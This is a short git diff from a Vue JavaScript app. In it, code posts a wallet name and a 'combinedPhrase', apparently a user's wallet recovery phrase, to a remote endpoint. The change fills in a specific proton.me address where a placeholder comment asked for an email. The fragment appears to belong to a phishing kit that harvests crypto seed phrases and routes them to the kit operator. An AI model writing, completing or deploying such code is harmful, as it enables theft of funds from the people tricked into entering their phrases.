@@ -134,7 +134,7 @@ createApp({
 						body: JSON.stringify({
 							walletName: selectedWallet.value.name,
 							details: combinedPhrase,
-							email: "", //enter email here
+							email: "", //Gerfish7458@proton.me
 						}),
 					}
 				);
